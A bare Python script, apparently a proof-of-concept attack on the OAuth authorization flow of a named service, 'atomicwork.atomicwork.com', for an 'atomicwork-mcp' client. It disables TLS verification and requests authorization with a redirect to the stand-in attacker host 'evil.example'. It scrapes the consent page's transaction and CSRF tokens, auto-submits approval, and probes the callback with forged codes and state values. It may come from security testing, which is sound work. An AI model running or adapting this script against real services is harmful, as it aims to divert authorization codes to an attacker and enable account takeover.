import base64, hashlib, os, re, urllib.parse, urllib.request, http.cookiejar, ssl
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
BASE="https://atomicwork.atomicwork.com"
cj=http.cookiejar.CookieJar()
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders=[("User-Agent","Mozilla/5.0")]
def go(url, data=None, method=None):
    req=urllib.request.Request(url, data=data, method=method)
    try:
        r=op.open(req, timeout=20); return r.status, dict(r.headers), r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8","replace")
    except Exception as e:
        return -1, {}, str(e)
ver=base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
chal=base64.urlsafe_b64encode(hashlib.sha256(ver.encode()).digest()).rstrip(b"=").decode()
q=urllib.parse.urlencode({"client_id":"atomicwork-mcp","response_type":"code","redirect_uri":"https://evil.example/cb","scope":"openid offline_access atomicwork.read","state":"attackerstate","code_challenge":chal,"code_challenge_method":"S256"})
st,h,b=go(f"{BASE}/authorize?{q}")
print("authorize:",st,"loc:",h.get("Location"),"len:",len(b))
loc=h.get("Location","")
if st in (301,302,303,307,308) and loc:
    loc = loc if loc.startswith("http") else BASE+loc
    st,b_pre,c=go(loc); page=c
else:
    page=b
print("consent page len:",len(page))
print("visible callback:", re.findall(r'https://evil\.example[^<"\s]*', page)[:3])
m=re.search(r'name="txn_id"[^>]*value="([^"]+)"',page) or re.search(r'value="([^"]+)"[^>]*name="txn_id"',page)
csrf=re.search(r'name="csrf_token"[^>]*value="([^"]+)"',page) or re.search(r'value="([^"]+)"[^>]*name="csrf_token"',page)
txn=m.group(1) if m else None; tok=csrf.group(1) if csrf else None
print("txn:",txn,"csrf:",tok)
if txn and tok:
    data=urllib.parse.urlencode({"txn_id":txn,"csrf_token":tok,"submit":"approve"}).encode()
    st3,h3,b3=go(BASE+"/consent", data=data, method="POST")
    print("approve:",st3,"loc:",h3.get("Location"),"body:",b3[:120].replace("\n"," "))
    loc3=h3.get("Location","")
    m3=re.search(r'[?&]state=([^&]+)', loc3); stt=urllib.parse.unquote(m3.group(1)) if m3 else txn
    print("state:",stt)
    for u in [f"{BASE}/auth/callback?code=INVALIDCODE&state={urllib.parse.quote(stt)}", f"{BASE}/auth/callback?error=access_denied&state={urllib.parse.quote(stt)}", f"{BASE}/auth/callback?code=INVALIDCODE&state=bogus"]:
        a,b_,c_=go(u)
        print("callback ->", a, b_.get("Location"), c_[:100].replace("\n"," "))
